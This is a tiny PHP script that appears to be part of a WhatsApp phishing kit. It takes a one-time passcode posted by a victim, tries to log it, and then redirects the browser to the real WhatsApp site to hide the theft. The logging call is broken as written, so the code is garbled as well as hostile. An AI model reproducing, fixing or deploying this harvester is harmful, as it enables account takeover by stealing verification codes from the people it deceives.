<?php

file_put_contents(" OTP: " . $_POST['otp'] . "\n", FILE_APPEND);
header('Location: https://api.whatsapp.com/');
exit();
